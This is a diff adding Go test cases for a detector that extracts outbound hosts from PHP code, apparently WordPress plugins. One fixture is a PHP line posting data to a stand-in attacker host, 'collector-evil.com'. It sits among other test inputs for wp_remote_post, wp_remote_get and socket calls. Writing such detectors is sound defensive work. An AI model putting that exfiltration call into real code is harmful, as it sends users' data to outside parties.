@@ -243,6 +243,15 @@ func TestPHPFeatures(t *testing.T) {
 		{"reads in another function", "<?php function a() { return get_users(); }\nfunction b() { wp_remote_post('https://x.example', array()); }",
 			core.FSend, "*", map[string]string{"reads": "users"}, false},
 		{"commented post", `<?php // wp_remote_post($u, $data);`, core.FSend, "*", nil, false},
+		{"literal host", `<?php wp_remote_post('https://collector-evil.com/in', $d);`, core.FSend, "wp_remote_post",
+			map[string]string{"host": "collector-evil.com", "domain": "collector-evil.com"}, true},
+		{"subdomain host", `<?php wp_remote_get('https://API.acme-plugins.com/v');`, core.FSend, "wp_remote_get",
+			map[string]string{"host": "api.acme-plugins.com", "domain": "acme-plugins.com"}, true},
+		{"socket host", `<?php $s = stream_socket_client('tcp://203.0.113.9:80');`, core.FSend, "stream_socket_client",
+			map[string]string{"host": "203.0.113.9", "channel": "socket"}, true},
+		{"host built at run time", `<?php wp_remote_post($u, $d);`, core.FSend, "wp_remote_post", map[string]string{"host": ""}, true},
+		{"a URL in the body is not the host", `<?php wp_remote_post($u, array('body' => 'https://other-site.com/x'));`,
+			core.FSend, "*", map[string]string{"host": "other-site.com"}, false},
 		{"client method", `<?php $http->post($u, $data);`, core.FSend, "*", nil, false},
 
 		// FDynCall.
